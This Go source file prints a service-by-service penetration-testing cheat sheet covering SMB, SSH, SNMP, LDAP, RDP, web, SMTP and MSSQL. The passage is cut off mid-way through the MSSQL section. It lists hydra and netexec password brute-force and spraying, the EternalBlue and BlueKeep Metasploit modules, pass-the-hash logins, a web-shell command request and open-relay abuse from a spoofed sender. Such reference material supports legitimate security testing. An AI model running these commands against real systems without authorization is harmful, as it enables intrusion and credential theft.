package ui

import "fmt"

// SMB
func infoSmb() {
	fmt.Println(Cyan("────────────────────────────────────────"))
	fmt.Println(Cyan("SMB"))
	fmt.Println(Cyan("────────────────────────────────────────"))

	fmt.Println()
	fmt.Println(Yellow("[ What To Look For ]"))
	fmt.Println("- SMB version (SMBv1 enabled?)")
	fmt.Println("- SMB signing (required / not required)")
	fmt.Println("- Anonymous / null session access")
	fmt.Println("- Share enumeration & permissions (READ / WRITE)")
	fmt.Println("- Sensitive files in shares (configs, backups, creds)")
	fmt.Println("- Local admin access (if creds available)")
	fmt.Println("- Known critical vulns (e.g., " + Red("MS17-010") + ")")

	fmt.Println()
	fmt.Println(Yellow("[ Misconfiguration Checks ]"))
	fmt.Println("- " + Red("SMBv1 enabled"))
	fmt.Println("- " + Red("Signing not required"))
	fmt.Println("- " + Red("Null session allowed"))
	fmt.Println("- " + Red("Writable shares for Everyone"))
	fmt.Println("- " + Red("Anonymous share listing allowed"))

	fmt.Println()
	fmt.Println(Yellow("[ Enumeration ]"))

	fmt.Println()
	fmt.Println(Green("enum4linux / enum4linux-ng"))
	fmt.Println("  " + Cyan("RPC & domain enumeration"))
	fmt.Println("  Example: " + Yellow("enum4linux -a <target>"))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("SMB enumeration & share discovery"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec smb <target> --shares"))
	fmt.Println("    " + Yellow("netexec smb <target> --users"))

	fmt.Println()
	fmt.Println(Green("smbmap"))
	fmt.Println("  " + Cyan("Enumerate shares & permissions"))
	fmt.Println("  Example: " + Yellow("smbmap -H <target>"))

	fmt.Println()
	fmt.Println(Green("smbclient"))
	fmt.Println("  " + Cyan("Manual share listing / browsing"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("smbclient -L //<target>/ -N"))
	fmt.Println("    " + Yellow("smbclient //<target>/SHARE -U user"))

	fmt.Println()
	fmt.Println(Green("metasploit (scanner)"))
	fmt.Println("  " + Cyan("SMB discovery & vulnerability checks"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("auxiliary/scanner/smb/smb_version") + "  " + Cyan("# SMB version/banner"))
	fmt.Println("    " + Yellow("auxiliary/scanner/smb/smb_enumshares") + "  " + Cyan("# enumerate shares (often needs creds)"))
	fmt.Println("    " + Yellow("auxiliary/scanner/smb/smb_ms17_010") + "  " + Cyan("# check MS17-010"))

	fmt.Println()
	fmt.Println(Yellow("[ Credential Attack ]"))

	fmt.Println()
	fmt.Println(Green("hydra"))
	fmt.Println("  " + Cyan("SMB password brute-force / spray"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("hydra -l user -P wordlist.txt smb://<target>"))
	fmt.Println("    " + Yellow("hydra -L users.txt -P passwords.txt smb://<target>"))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("Credential validation & password spray"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec smb <target> -u user -p pass"))
	fmt.Println("    " + Yellow("netexec smb <target> -U users.txt -P passwords.txt"))

	fmt.Println()
	fmt.Println(Green("crackmapexec"))
	fmt.Println("  " + Cyan("Credential validation (legacy alternative)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("crackmapexec smb <target> -u user -p pass"))
	fmt.Println("    " + Yellow("crackmapexec smb <target> -U users.txt -P passwords.txt"))

	fmt.Println()
	fmt.Println(Green("metasploit (auth)"))
	fmt.Println("  " + Cyan("Credential validation / login attempts"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("auxiliary/scanner/smb/smb_login") + "  " + Cyan("# SMB login attempts"))

	fmt.Println()
	fmt.Println(Yellow("[ Exploitation ]"))

	fmt.Println()
	fmt.Println(Green("metasploit"))
	fmt.Println("  " + Cyan("Remote code execution via SMB (when applicable)"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("exploit/windows/smb/ms17_010_eternalblue") + "  " + Cyan("# EternalBlue (RCE)"))
	fmt.Println("    " + Yellow("exploit/windows/smb/ms17_010_psexec") + "  " + Cyan("# MS17-010 via psexec method"))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("Post-auth execution if admin access obtained"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec smb <target> -u user -p pass -x \"whoami\""))

	fmt.Println()
	fmt.Println(Green("crackmapexec"))
	fmt.Println("  " + Cyan("Post-auth execution (legacy alternative)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("crackmapexec smb <target> -u user -p pass -x \"whoami\""))

	fmt.Println(Cyan("────────────────────────────────────────"))
}

//SSH
func infoSsh() {
	fmt.Println(Cyan("────────────────────────────────────────"))
	fmt.Println(Cyan("SSH"))
	fmt.Println(Cyan("────────────────────────────────────────"))

	fmt.Println()
	fmt.Println(Yellow("[ Common Misconfigurations ]"))
	fmt.Println("- " + Red("Password authentication enabled"))
	fmt.Println("- " + Red("Root login allowed"))
	fmt.Println("- " + Red("Outdated OpenSSH version"))
	fmt.Println("- " + Red("No rate limiting (bruteforce possible)"))
	fmt.Println("- " + Red("Credential reuse across hosts"))

	fmt.Println()
	fmt.Println(Yellow("[ Enumeration ]"))

	fmt.Println()
	fmt.Println(Green("ssh-audit"))
	fmt.Println("  " + Cyan("Audit SSH configuration & crypto strength"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("ssh-audit <target>"))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("SSH enumeration & credential validation"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec ssh <target>"))
	fmt.Println("    " + Yellow("netexec ssh <target> -u user -p pass"))

	fmt.Println()
	fmt.Println(Green("metasploit (scanner)"))
	fmt.Println("  " + Cyan("SSH discovery & version checks"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("auxiliary/scanner/ssh/ssh_version") + "  " + Cyan("# detect SSH version"))
	fmt.Println("    " + Yellow("auxiliary/scanner/ssh/ssh_enumusers") + "  " + Cyan("# enumerate valid users (if possible)"))

	fmt.Println()
	fmt.Println(Yellow("[ Credential Attack ]"))

	fmt.Println()
	fmt.Println(Green("hydra"))
	fmt.Println("  " + Cyan("SSH password brute-force / spray"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("hydra -l user -P wordlist.txt ssh://<target>"))
	fmt.Println("    " + Yellow("hydra -L users.txt -P passwords.txt ssh://<target>"))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("Credential validation & password spray"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec ssh <target> -u user -p pass"))
	fmt.Println("    " + Yellow("netexec ssh <target> -U users.txt -P passwords.txt"))

	fmt.Println()
	fmt.Println(Green("crackmapexec"))
	fmt.Println("  " + Cyan("Credential validation (legacy alternative)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("crackmapexec ssh <target> -u user -p pass"))
	fmt.Println("    " + Yellow("crackmapexec ssh <target> -U users.txt -P passwords.txt"))

	fmt.Println()
	fmt.Println(Green("metasploit (auth)"))
	fmt.Println("  " + Cyan("SSH login attempts / brute-force"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("auxiliary/scanner/ssh/ssh_login") + "  " + Cyan("# SSH login attempts"))

	fmt.Println()
	fmt.Println(Yellow("[ Exploitation ]"))

	fmt.Println()
	fmt.Println(Green("ssh"))
	fmt.Println("  " + Cyan("Direct shell access (if valid creds or key obtained)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("ssh user@<target>"))
	fmt.Println("    " + Yellow("ssh -i id_rsa user@<target>"))

	fmt.Println()
	fmt.Println(Green("metasploit"))
	fmt.Println("  " + Cyan("SSH post-auth command execution"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("exploit/multi/ssh/sshexec") + "  " + Cyan("# command execution via SSH"))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("Post-auth command execution"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec ssh <target> -u user -p pass -x \"whoami\""))

	fmt.Println(Cyan("────────────────────────────────────────"))
}

// SNMP
func infoSnmp(){
	fmt.Println(Cyan("────────────────────────────────────────"))
	fmt.Println(Cyan("SNMP"))
	fmt.Println(Cyan("────────────────────────────────────────"))

	fmt.Println()
	fmt.Println(Yellow("[ Common Misconfigurations ]"))
	fmt.Println("- " + Red("Default community string (public / private)"))
	fmt.Println("- " + Red("SNMP v1 enabled"))
	fmt.Println("- " + Red("SNMP v2c without authentication"))
	fmt.Println("- " + Red("Read-write community string exposed"))
	fmt.Println("- " + Red("SNMP exposed to internet"))
	fmt.Println("- " + Red("Sensitive system information accessible"))
	fmt.Println("- " + Red("No access control (any IP allowed)"))
	fmt.Println("- " + Red("Weak SNMPv3 authentication (if used)"))

	fmt.Println()
	fmt.Println(Yellow("[ Enumeration ]"))

	fmt.Println()
	fmt.Println(Green("onesixtyone"))
	fmt.Println("  " + Cyan("Fast SNMP community string discovery"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("onesixtyone -c communities.txt <target>"))

	fmt.Println()
	fmt.Println(Green("snmpwalk"))
	fmt.Println("  " + Cyan("Enumerate full SNMP tree (requires valid community)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("snmpwalk -v2c -c public <target>"))

	fmt.Println()
	fmt.Println(Green("snmp-check"))
	fmt.Println("  " + Cyan("Automated SNMP enumeration"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("snmp-check -c public <target>"))

	fmt.Println()
	fmt.Println(Green("metasploit (scanner)"))
	fmt.Println("  " + Cyan("SNMP discovery & enumeration"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("auxiliary/scanner/snmp/snmp_login") + "  " + Cyan("# bruteforce community string"))
	fmt.Println("    " + Yellow("auxiliary/scanner/snmp/snmp_enum") + "  " + Cyan("# enumerate system information"))
	fmt.Println("    " + Yellow("auxiliary/scanner/snmp/snmp_enumusers") + "  " + Cyan("# enumerate Windows users"))
	fmt.Println("    " + Yellow("auxiliary/scanner/snmp/snmp_enumshares") + "  " + Cyan("# enumerate Windows shares"))

	fmt.Println()
	fmt.Println(Yellow("[ Credential Attack ]"))

	fmt.Println()
	fmt.Println(Green("hydra"))
	fmt.Println("  " + Cyan("SNMP community brute-force"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("hydra -P wordlist.txt <target> snmp"))

	fmt.Println()
	fmt.Println(Green("onesixtyone"))
	fmt.Println("  " + Cyan("Community string brute-force (fast UDP scanning)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("onesixtyone -c communities.txt <target>"))

	fmt.Println()
	fmt.Println(Green("metasploit (auth)"))
	fmt.Println("  " + Cyan("SNMP login / brute-force attempts"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("auxiliary/scanner/snmp/snmp_login"))

	fmt.Println()
	fmt.Println(Yellow("[ Exploitation ]"))

	fmt.Println()
	fmt.Println(Green("snmpset"))
	fmt.Println("  " + Cyan("Modify SNMP values (requires read-write community)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("snmpset -v2c -c private <target> <OID> i 1"))

	fmt.Println()
	fmt.Println(Green("snmpwalk"))
	fmt.Println("  " + Cyan("Extract sensitive information"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1"))

	fmt.Println()
	fmt.Println(Green("metasploit"))
	fmt.Println("  " + Cyan("Leverage SNMP info for further compromise"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("auxiliary/scanner/snmp/snmp_enumusers"))
	fmt.Println("    " + Yellow("auxiliary/scanner/snmp/snmp_enumshares"))

	fmt.Println(Cyan("────────────────────────────────────────"))
}

// LDAP
func infoLdap(){
	fmt.Println(Cyan("────────────────────────────────────────"))
	fmt.Println(Cyan("LDAP"))
	fmt.Println(Cyan("────────────────────────────────────────"))

	fmt.Println()
	fmt.Println(Yellow("[ Common Misconfigurations ]"))
	fmt.Println("- " + Red("Anonymous bind allowed"))
	fmt.Println("- " + Red("LDAP signing not enforced"))
	fmt.Println("- " + Red("LDAP over cleartext (no LDAPS)"))
	fmt.Println("- " + Red("Weak credentials exposed"))
	fmt.Println("- " + Red("Excessive privileges assigned to users"))
	fmt.Println("- " + Red("Sensitive attributes readable (description, pwdLastSet, etc)"))
	fmt.Println("- " + Red("Unrestricted LDAP queries from any IP"))
	fmt.Println("- " + Red("Domain users allowed to enumerate entire directory"))

	fmt.Println()
	fmt.Println(Yellow("[ Enumeration ]"))

	fmt.Println()
	fmt.Println(Green("ldapsearch"))
	fmt.Println("  " + Cyan("Manual LDAP query & base enumeration"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("ldapsearch -x -H ldap://<target> -s base"))
	fmt.Println("    " + Yellow("ldapsearch -x -H ldap://<target> -b \"dc=domain,dc=local\""))

	fmt.Println()
	fmt.Println(Green("ldapdomaindump"))
	fmt.Println("  " + Cyan("Dump Active Directory information via LDAP"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("ldapdomaindump ldap://<target>"))
	fmt.Println("    " + Yellow("ldapdomaindump -u user -p pass ldap://<target>"))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("LDAP enumeration & domain discovery"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec ldap <target>"))
	fmt.Println("    " + Yellow("netexec ldap <target> -u user -p pass --users"))
	fmt.Println("    " + Yellow("netexec ldap <target> -u user -p pass --groups"))

	fmt.Println()
	fmt.Println(Green("crackmapexec"))
	fmt.Println("  " + Cyan("LDAP domain enumeration (legacy alternative)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("crackmapexec ldap <target> -u user -p pass"))

	fmt.Println()
	fmt.Println(Green("metasploit (scanner)"))
	fmt.Println("  " + Cyan("LDAP enumeration modules"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("auxiliary/scanner/ldap/ldap_enum") + "  " + Cyan("# enumerate domain objects"))
	fmt.Println("    " + Yellow("auxiliary/gather/ldap_query") + "  " + Cyan("# custom LDAP queries"))

	fmt.Println()
	fmt.Println(Yellow("[ Credential Attack ]"))

	fmt.Println()
	fmt.Println(Green("hydra"))
	fmt.Println("  " + Cyan("Bruteforce LDAP credentials"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("hydra -l user -P wordlist.txt ldap://<target>"))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("Credential validation & password spray"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec ldap <target> -u user -p pass"))
	fmt.Println("    " + Yellow("netexec ldap <target> -U users.txt -P passwords.txt"))

	fmt.Println()
	fmt.Println(Green("crackmapexec"))
	fmt.Println("  " + Cyan("Credential validation (legacy alternative)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("crackmapexec ldap <target> -u user -p pass"))
	fmt.Println("    " + Yellow("crackmapexec ldap <target> -U users.txt -P passwords.txt"))

	fmt.Println()
	fmt.Println(Green("metasploit (auth)"))
	fmt.Println("  " + Cyan("LDAP login attempts"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("auxiliary/scanner/ldap/ldap_login") + "  " + Cyan("# credential validation"))

	fmt.Println()
	fmt.Println(Yellow("[ Exploitation ]"))

	fmt.Println()
	fmt.Println(Green("ldapsearch"))
	fmt.Println("  " + Cyan("Extract sensitive domain information"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("ldapsearch -x -H ldap://<target> -b \"dc=domain,dc=local\" \"(objectClass=user)\""))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("Leverage valid creds for further domain recon"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec ldap <target> -u user -p pass --users"))
	fmt.Println("    " + Yellow("netexec ldap <target> -u user -p pass --groups"))

	fmt.Println()
	fmt.Println(Green("metasploit"))
	fmt.Println("  " + Cyan("Post-auth LDAP abuse"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("auxiliary/gather/ldap_query"))

	fmt.Println(Cyan("────────────────────────────────────────"))
}

// RDP
func infoRdp(){
	fmt.Println(Cyan("────────────────────────────────────────"))
	fmt.Println(Cyan("RDP"))
	fmt.Println(Cyan("────────────────────────────────────────"))

	fmt.Println()
	fmt.Println(Yellow("[ Common Misconfigurations ]"))
	fmt.Println("- " + Red("Network Level Authentication (NLA) disabled"))
	fmt.Println("- " + Red("Weak / reused credentials"))
	fmt.Println("- " + Red("Outdated RDP service"))
	fmt.Println("- " + Red("No account lockout policy"))
	fmt.Println("- " + Red("RDP exposed to internet"))
	fmt.Println("- " + Red("BlueKeep (CVE-2019-0708) vulnerable"))
	fmt.Println("- " + Red("RestrictedAdmin mode enabled (credential exposure risk)"))
	fmt.Println("- " + Red("Excessive users allowed RDP access"))

	fmt.Println()
	fmt.Println(Yellow("[ Enumeration ]"))

	fmt.Println()
	fmt.Println(Green("rdp-sec-check"))
	fmt.Println("  " + Cyan("Check RDP security configuration"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("rdp-sec-check <target>"))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("RDP service discovery & basic checks"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec rdp <target>"))

	fmt.Println()
	fmt.Println(Green("metasploit (scanner)"))
	fmt.Println("  " + Cyan("RDP detection & vulnerability checks"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("auxiliary/scanner/rdp/rdp_scanner") + "  " + Cyan("# detect RDP service"))
	fmt.Println("    " + Yellow("auxiliary/scanner/rdp/cve_2019_0708_bluekeep") + "  " + Cyan("# check BlueKeep vulnerability"))

	fmt.Println()
	fmt.Println(Yellow("[ Credential Attack ]"))

	fmt.Println()
	fmt.Println(Green("hydra"))
	fmt.Println("  " + Cyan("Bruteforce RDP credentials"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("hydra -l user -P wordlist.txt rdp://<target>"))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("Credential validation & password spray"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec rdp <target> -u user -p pass"))
	fmt.Println("    " + Yellow("netexec rdp <target> -U users.txt -P passwords.txt"))

	fmt.Println()
	fmt.Println(Green("crackmapexec"))
	fmt.Println("  " + Cyan("Credential validation (legacy alternative)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("crackmapexec rdp <target> -u user -p pass"))
	fmt.Println("    " + Yellow("crackmapexec rdp <target> -U users.txt -P passwords.txt"))

	fmt.Println()
	fmt.Println(Green("metasploit (auth)"))
	fmt.Println("  " + Cyan("RDP login attempts"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("auxiliary/scanner/rdp/rdp_login") + "  " + Cyan("# credential validation"))

	fmt.Println()
	fmt.Println(Yellow("[ Exploitation ]"))

	fmt.Println()
	fmt.Println(Green("xfreerdp"))
	fmt.Println("  " + Cyan("Direct RDP access (if valid creds or hash obtained)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("xfreerdp /u:user /p:pass /v:<target>"))
	fmt.Println("    " + Yellow("xfreerdp /u:user /pth:<NTLM_hash> /v:<target>"))
	fmt.Println("    " + Yellow("xfreerdp /u:user /p:pass /d:domain /v:<target>"))

	fmt.Println()
	fmt.Println(Green("metasploit"))
	fmt.Println("  " + Cyan("BlueKeep exploitation (if vulnerable)"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("exploit/windows/rdp/cve_2019_0708_bluekeep"))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("Post-auth command execution (if supported)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec rdp <target> -u user -p pass -x \"whoami\""))

	fmt.Println(Cyan("────────────────────────────────────────"))
}

// Web-svc
func infoWebservice(){
	fmt.Println(Cyan("────────────────────────────────────────"))
	fmt.Println(Cyan("WEB (HTTP/HTTPS)"))
	fmt.Println(Cyan("────────────────────────────────────────"))

	fmt.Println()
	fmt.Println(Yellow("[ Common Misconfigurations ]"))
	fmt.Println("- " + Red("Directory listing enabled"))
	fmt.Println("- " + Red("Exposed sensitive files (.env, backup.zip, .git, config)"))
	fmt.Println("- " + Red("Admin panels exposed (/admin, /dashboard)"))
	fmt.Println("- " + Red("Debug endpoints exposed (/debug, /api, /swagger)"))
	fmt.Println("- " + Red("Weak authentication / IDOR"))
	fmt.Println("- " + Red("Missing security headers"))
	fmt.Println("- " + Red("Outdated web server / CMS version"))
	fmt.Println("- " + Red("CORS misconfiguration (wildcard origin)"))
	fmt.Println("- " + Red("File upload without validation"))

	fmt.Println()
	fmt.Println(Yellow("[ Enumeration ]"))

	fmt.Println()
	fmt.Println(Green("httpx"))
	fmt.Println("  " + Cyan("Fast HTTP probing & service fingerprinting"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("httpx -u http://<target> -status-code -title -tech-detect"))
	fmt.Println("    " + Yellow("httpx -l targets.txt"))

	fmt.Println()
	fmt.Println(Green("dirsearch"))
	fmt.Println("  " + Cyan("Directory & file brute-force discovery"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("dirsearch -u http://<target>"))
	fmt.Println("    " + Yellow("dirsearch -u http://<target> -e php,txt,zip,conf"))

	fmt.Println()
	fmt.Println(Green("nikto"))
	fmt.Println("  " + Cyan("Web server misconfiguration scanning"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("nikto -h http://<target>"))

	fmt.Println()
	fmt.Println(Green("nuclei"))
	fmt.Println("  " + Cyan("Template-based vulnerability scanning"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("nuclei -u http://<target>"))
	fmt.Println("    " + Yellow("nuclei -u http://<target> -severity critical,high"))

	fmt.Println()
	fmt.Println(Green("metasploit (scanner)"))
	fmt.Println("  " + Cyan("HTTP service scanning modules"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("auxiliary/scanner/http/http_version") + "  " + Cyan("# identify server/banner"))
	fmt.Println("    " + Yellow("auxiliary/scanner/http/dir_scanner") + "  " + Cyan("# directory discovery"))
	fmt.Println("    " + Yellow("auxiliary/scanner/http/files_dir") + "  " + Cyan("# common sensitive files"))

	fmt.Println()
	fmt.Println(Yellow("[ Credential Attack ]"))

	fmt.Println()
	fmt.Println(Green("hydra"))
	fmt.Println("  " + Cyan("HTTP login brute-force"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("hydra -l admin -P wordlist.txt http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\""))

	fmt.Println()
	fmt.Println(Green("ffuf"))
	fmt.Println("  " + Cyan("Parameter fuzzing & virtual host discovery"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("ffuf -u http://<target>/FUZZ -w wordlist.txt"))
	fmt.Println("    " + Yellow("ffuf -u http://<target> -H \"Host: FUZZ.domain.com\" -w subdomains.txt"))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("Web credential validation (basic auth / supported services)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec http <target> -u user -p pass"))

	fmt.Println()
	fmt.Println(Green("metasploit (auth)"))
	fmt.Println("  " + Cyan("HTTP login modules"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("auxiliary/scanner/http/http_login"))

	fmt.Println()
	fmt.Println(Yellow("[ Exploitation ]"))

	fmt.Println()
	fmt.Println(Green("nuclei"))
	fmt.Println("  " + Cyan("Exploit known CVEs (if applicable)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("nuclei -u http://<target> -t cves/"))

	fmt.Println()
	fmt.Println(Green("metasploit"))
	fmt.Println("  " + Cyan("Web exploit modules"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("exploit/multi/http/...") + "  " + Cyan("# depends on detected vulnerability"))

	fmt.Println()
	fmt.Println(Green("manual exploitation"))
	fmt.Println("  " + Cyan("File upload abuse / RCE / LFI / SQLi (if discovered)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("curl http://<target>/vuln.php?cmd=id"))

	fmt.Println(Cyan("────────────────────────────────────────"))
}

// SMTP
func infoSmtp(){
	fmt.Println(Cyan("────────────────────────────────────────"))
	fmt.Println(Cyan("SMTP"))
	fmt.Println(Cyan("────────────────────────────────────────"))

	fmt.Println()
	fmt.Println(Yellow("[ Common Misconfigurations ]"))
	fmt.Println("- " + Red("Open relay enabled"))
	fmt.Println("- " + Red("VRFY / EXPN command enabled"))
	fmt.Println("- " + Red("Weak authentication mechanism"))
	fmt.Println("- " + Red("STARTTLS not enforced"))
	fmt.Println("- " + Red("Anonymous access allowed"))
	fmt.Println("- " + Red("Outdated mail server software"))
	fmt.Println("- " + Red("No rate limiting on authentication"))
	fmt.Println("- " + Red("Internal mail server exposed to internet"))

	fmt.Println()
	fmt.Println(Yellow("[ Enumeration ]"))

	fmt.Println()
	fmt.Println(Green("swaks"))
	fmt.Println("  " + Cyan("Manual SMTP testing (banner, relay, auth methods)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("swaks --server <target>"))
	fmt.Println("    " + Yellow("swaks --to test@domain.com --from attacker@evil.com --server <target>"))

	fmt.Println()
	fmt.Println(Green("smtp-user-enum"))
	fmt.Println("  " + Cyan("SMTP user enumeration via VRFY / RCPT"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("smtp-user-enum -M VRFY -U users.txt -t <target>"))
	fmt.Println("    " + Yellow("smtp-user-enum -M RCPT -U users.txt -t <target>"))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("SMTP service detection & credential validation"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec smtp <target>"))
	fmt.Println("    " + Yellow("netexec smtp <target> -u user -p pass"))

	fmt.Println()
	fmt.Println(Green("metasploit (scanner)"))
	fmt.Println("  " + Cyan("SMTP version & relay checks"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("auxiliary/scanner/smtp/smtp_version") + "  " + Cyan("# detect SMTP version/banner"))
	fmt.Println("    " + Yellow("auxiliary/scanner/smtp/smtp_enum") + "  " + Cyan("# enumerate users"))
	fmt.Println("    " + Yellow("auxiliary/scanner/smtp/smtp_relay") + "  " + Cyan("# test open relay"))

	fmt.Println()
	fmt.Println(Yellow("[ Credential Attack ]"))

	fmt.Println()
	fmt.Println(Green("hydra"))
	fmt.Println("  " + Cyan("Bruteforce SMTP authentication"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("hydra -l user -P wordlist.txt smtp://<target>"))
	fmt.Println("    " + Yellow("hydra -L users.txt -P passwords.txt smtp://<target>"))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("Credential validation & password spray"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec smtp <target> -u user -p pass"))
	fmt.Println("    " + Yellow("netexec smtp <target> -U users.txt -P passwords.txt"))

	fmt.Println()
	fmt.Println(Green("crackmapexec"))
	fmt.Println("  " + Cyan("Credential validation (legacy alternative)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("crackmapexec smtp <target> -u user -p pass"))

	fmt.Println()
	fmt.Println(Green("metasploit (auth)"))
	fmt.Println("  " + Cyan("SMTP login attempts"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("auxiliary/scanner/smtp/smtp_login") + "  " + Cyan("# credential validation"))

	fmt.Println()
	fmt.Println(Yellow("[ Exploitation ]"))

	fmt.Println()
	fmt.Println(Green("swaks"))
	fmt.Println("  " + Cyan("Abuse open relay (if vulnerable)"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("swaks --to victim@external.com --from attacker@evil.com --server <target>"))

	fmt.Println()
	fmt.Println(Green("metasploit"))
	fmt.Println("  " + Cyan("SMTP exploit modules (version dependent)"))
	fmt.Println("  Example modules:")
	fmt.Println("    " + Yellow("exploit/.../smtp/...") + "  " + Cyan("# depends on detected vulnerability"))

	fmt.Println()
	fmt.Println(Green("manual abuse"))
	fmt.Println("  " + Cyan("User enumeration / phishing infrastructure abuse"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("telnet <target> 25"))

	fmt.Println(Cyan("────────────────────────────────────────"))
}

func infoMssql(){
	fmt.Println(Cyan("────────────────────────────────────────"))
	fmt.Println(Cyan("MSSQL"))
	fmt.Println(Cyan("────────────────────────────────────────"))

	fmt.Println()
	fmt.Println(Yellow("[ Common Misconfigurations ]"))
	fmt.Println("- " + Red("Weak 'sa' password"))
	fmt.Println("- " + Red("xp_cmdshell enabled"))
	fmt.Println("- " + Red("Excessive privileges assigned to SQL users"))
	fmt.Println("- " + Red("Linked servers misconfigured"))
	fmt.Println("- " + Red("MSSQL exposed to internet"))
	fmt.Println("- " + Red("Service account running with high privileges"))
	fmt.Println("- " + Red("SQL authentication enabled (mixed mode)"))
	fmt.Println("- " + Red("Trustworthy database property enabled"))

	fmt.Println()
	fmt.Println(Yellow("[ Enumeration ]"))

	fmt.Println()
	fmt.Println(Green("netexec"))
	fmt.Println("  " + Cyan("MSSQL service detection & basic enumeration"))
	fmt.Println("  Example:")
	fmt.Println("    " + Yellow("netexec mssql <target>"))
	fmt.Println("    " + Yellow("netexec mssql <target> -u user -p pass --local-auth"))

	fmt.Println()
	fmt.Println(Green("impacket-mssqlclient"))
	fmt.Println("  " + Cyan("Interactive MSSQL client & manual enumeration"))
